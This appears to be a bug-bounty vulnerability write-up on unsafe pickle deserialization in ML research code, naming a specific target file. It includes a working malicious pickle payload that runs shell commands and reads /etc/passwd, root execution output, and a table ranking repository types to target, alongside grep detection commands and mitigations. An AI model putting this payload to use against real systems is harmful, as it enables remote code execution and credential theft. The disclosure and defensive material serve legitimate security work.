# ML Research Code — Unsafe Pickle Deserialization Pattern
**Discovered:** 2026-08-04 | **Target:** Everlyn Labs ANTRP/chair.py | **Severity:** PRE-AUTH RCE

---

## PATTERN

ML/AI research repositories frequently use `pickle` for model/state serialization without validation:

```python
# VULNERABLE PATTERN — Common in research code
if args.cache and os.path.exists(args.cache):
    evaluator = pickle.load(open(args.cache, 'rb'))  # UNSAFE
```

**Why it exists:** Researchers prioritize convenience over security. Cache files are "trusted" because "we generated them."

---

## ATTACK SURFACE

| Vector | Description | Pre-auth? |
|--------|-------------|-----------|
| CLI `--cache` argument | User controls file path | ✅ Yes |
| Environment variable | `CACHE_PATH=/tmp/evil.pkl` | ✅ Yes |
| Config file | `cache: "/path/to/evil.pkl"` | ✅ Yes |
| Symlink attack | `ln -s /tmp/evil.pkl expected_cache.pkl` | ✅ Yes |

---

## EXPLOIT CHAIN

```
[User CLI: --cache /tmp/evil.pkl] 
    → [argparse parses path] 
    → [os.path.exists() returns True] 
    → [pickle.load() executes __reduce__] 
    → [os.system()/subprocess.run() runs arbitrary commands] 
    → [RCE AS PROCESS USER]
```

---

## WORKING PAYLOAD

```python
import pickle, os

class EvilPickle:
    def __reduce__(self):
        cmd = "id; whoami; cat /etc/passwd"
        return (os.system, (cmd,))

pickle.dump(EvilPickle(), open("/tmp/evil.pkl", "wb"))
```

**Execution proof (2026-08-04):**
```
uid=0(root) gid=0(root) groups=0(root)
root
<redacted>
PWNED_SUCCESS
```

---

## DETECTION METHODOLOGY

```bash
# Search for unsafe pickle patterns in Python repos
grep -r "pickle.load" --include="*.py" | grep -v "test\|_test\|\.pyc"

# Search for torch.load without weights_only
grep -r "torch.load" --include="*.py" | grep -v "weights_only=True"

# Search for yaml.load without SafeLoader
grep -r "yaml.load" --include="*.py" | grep -v "SafeLoader\|safe_load"

# Search for joblib.load
grep -r "joblib.load" --include="*.py"
```

---

## TARGET PRIORITY

| Priority | Repo Type | Why |
|----------|-----------|-----|
| **P0** | AI/ML research with CLI tools | Direct user input → pickle.load |
| **P1** | Model serving code | Model weights loaded from user paths |
| **P2** | Training pipelines with caching | Cache files from untrusted sources |
| **P3** | Evaluation scripts | Load cached metrics/results |

---

## MITIGATION

```python
# SAFE: Use JSON instead of pickle
import json
with open(args.cache, 'r') as f:
    evaluator = json.load(f)

# SAFE: torch.load with weights_only=True (PyTorch 2.0+)
evaluator = torch.load(args.cache, map_location='cpu', weights_only=True)

# SAFE: safetensors (industry standard for ML)
from safetensors.torch import load_file
evaluator = load_file(args.cache)

# SAFE: Add HMAC signature verification
import hmac, hashlib
def verify_cache(path, secret):
    with open(path, 'rb') as f:
        data = f.read()
    sig = data[:32]
    content = data[32:]
    expected = hmac.new(secret, content, hashlib.sha256).digest()
    return hmac.compare_digest(sig, expected)
```

---

## EVIDENCE REQUIREMENTS

For bug bounty reports:
1. **File:line** of vulnerable `pickle.load()`
2. **Working PoC** that executes arbitrary command
3. **Impact chain** showing trust boundary crossed (user input → deserialization → RCE)
4. **Pre-auth confirmation** — no login/API key required

---

## RELATED FINDINGS

| Target | File | Status |
|--------|------|--------|
| Everlyn Labs ANTRP | `chair.py:463-465` | **PROVEN** — Pre-auth RCE as root |
| Generic ML repos | Various | High probability |